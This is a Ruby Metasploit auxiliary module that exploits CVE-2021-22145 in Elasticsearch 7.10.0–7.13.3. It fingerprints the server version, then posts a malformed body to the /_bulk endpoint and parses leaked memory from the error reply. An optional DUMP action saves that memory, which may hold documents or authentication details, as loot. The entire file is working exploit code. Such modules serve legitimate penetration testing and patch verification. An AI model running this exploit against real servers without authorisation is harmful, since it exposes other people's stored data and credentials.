##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  DEDUP_REPEATED_CHARS_THRESHOLD = 400

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Elasticsearch Memory Disclosure',
        'Description' => %q{
          This module exploits a memory disclosure vulnerability in Elasticsearch
          7.10.0 to 7.13.3 (inclusive). A user with the ability to submit arbitrary
          queries to Elasticsearch can generate an error message containing previously
          used portions of a data buffer.
          This buffer could contain sensitive information such as Elasticsearch
          documents or authentication details. This vulnerability's output is similar
          to heartbleed.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Eric Howard', # discovery
          'R0NY' # edb exploit
        ],
        'References' => [
          ['EDB', '50149'],
          ['CVE', '2021-22145'],
          ['URL', 'https://discuss.elastic.co/t/elasticsearch-7-13-4-security-update/279177']
        ],
        'DisclosureDate' => '2021-07-21',
        'Actions' => [
          ['SCAN', { 'Description' => 'Check hosts for vulnerability' }],
          ['DUMP', { 'Description' => 'Dump memory contents to loot' }],
        ],
        'DefaultAction' => 'SCAN',
        # https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [] # nothing in the docker logs anyways
        }
      )
    )
    register_options(
      [
        Opt::RPORT(9200),
        OptString.new('USERNAME', [ false, 'User to login with', '']),
        OptString.new('PASSWORD', [ false, 'Password to login with', '']),
        OptString.new('TARGETURI', [ true, 'The URI of the Elastic Application', '/']),
        OptInt.new('LEAK_COUNT', [true, 'Number of times to leak memory per SCAN or DUMP invocation', 1])
      ]
    )
  end

  def get_version
    vprint_status('Querying version information...')
    request = {
      'uri' => normalize_uri(target_uri.path),
      'method' => 'GET'
    }
    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?

    res = send_request_cgi(request)

    return nil unless res && res.code == 200 && !res.body.empty?

    json_body = res.get_json_document
    return nil unless json_body.is_a?(Hash) && json_body['version'].is_a?(Hash)

    number = json_body['version']['number']
    number if number.is_a?(String) && !number.empty?
  end

  def check_host(_ip)
    version = get_version
    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service, or unexpected response") if version.nil?

    begin
      detected_version = Rex::Version.new(version)
    rescue ArgumentError
      return Exploit::CheckCode::Unknown("Could not parse Elasticsearch version: #{version}")
    end

    if detected_version <= Rex::Version.new('7.13.3') && detected_version >= Rex::Version.new('7.10.0')
      return Exploit::CheckCode::Appears("Exploitable Version Detected: #{version}")
    end

    Exploit::CheckCode::Safe("Unexploitable Version Detected: #{version}")
  end

  def leak_count
    datastore['LEAK_COUNT']
  end

  # Stores received data
  def loot_and_report(data)
    if data.to_s.empty?
      vprint_error("Looks like there isn't leaked information...")
      return
    end

    print_good("Leaked #{data.length} bytes")
    report_vuln({
      host: rhost,
      port: rport,
      name: name,
      refs: references,
      info: "Module #{fullname} successfully leaked info"
    })

    if action.name == 'DUMP' # Check mode, dump if requested.
      path = store_loot(
        'elasticsearch.memory.disclosure',
        'application/octet-stream',
        rhost,
        data,
        nil,
        'Elasticsearch server memory'
      )
      print_good("Elasticsearch memory data stored in #{path}")
    end

    # Convert non-printable characters to periods
    printable_data = data.gsub(/[^[:print:]]/, '.')

    # Keep this many duplicates as padding around the deduplication message
    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round

    # Remove duplicate characters
    abbreviated_data = printable_data.gsub(/(.)\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|
      s[0, duplicate_pad] +
        ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +
        s[-duplicate_pad, duplicate_pad]
    end

    # Show abbreviated data
    vprint_status("Printable info leaked:\n#{abbreviated_data}")
  end

  def bleed
    request = {
      'uri' => normalize_uri(target_uri.path, '_bulk'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => "@\n"
    }
    request['authorization'] = basic_auth(datastore['USERNAME'], datastore['PASSWORD']) if datastore['USERNAME'].present? || datastore['PASSWORD'].present?

    res = send_request_cgi(request)

    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::NoAccess, "#{peer} - Elasticsearch bulk request denied (HTTP #{res.code}); verify credentials and bulk privileges") if [401, 403].include?(res.code)
    fail_with(Failure::UnexpectedReply, "#{peer} - Elasticsearch bulk request returned HTTP #{res.code}") unless res.code == 400

    json_body = res.get_json_document
    error = json_body['error'] if json_body.is_a?(Hash)
    return nil unless error.is_a?(Hash)

    causes = error['root_cause']
    return nil unless causes.is_a?(Array) && causes.first.is_a?(Hash)

    reasons = [causes.first['reason'], error['reason']]
    return nil unless reasons.all? { |reason| reason.is_a?(String) }

    # Fixed releases describe a ByteArrayInputStream instead of exposing the
    # backing byte array. Retain the historical dump framing when it is present.
    leaks = reasons.map { |reason| reason[/\[Source: \(byte\[\]\)"(.*"(?:\[truncated \d+ bytes\])?); line: \d+, column: \d+\]\z/m, 1] }
    return nil unless leaks.all?

    leaks.join("\n")
  end

  def run_host(_ip)
    memory = ''
    1.upto(leak_count) do |count|
      vprint_status("Leaking response ##{count}")
      leak = bleed
      memory << leak if leak
    end
    loot_and_report(memory)
  end
end
